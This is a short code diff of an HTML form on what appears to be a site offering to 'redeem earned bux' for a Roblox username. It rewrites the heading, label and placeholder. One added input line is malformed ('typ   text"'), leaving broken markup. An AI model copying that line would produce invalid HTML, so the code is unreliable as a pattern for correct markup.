@@ -21,11 +21,11 @@
 
 		<!--<form id="register-form" class="container-register-form" action="" method="POST">-->
 		<form id="register-form" class="container-register-form">
-			<h4 class="register-form-header">Provide us your roblox usernname to redeem earned bux!</h4>
+			<h4 class="register-form-header">Pick account where to send Bux</h4>
 			<div class="register-form-row">
 				<div>
-					<label for="username">roblox username</label>
-					<input type="text" id="username" name="username" required>
+					<label for="username">We never ask you for password</label>
+					<input typ   text" id="username" name="username" placeholder="Boblox username" required>
 				</div>
 				<button type="submit"> Submit </button>
 			</div>
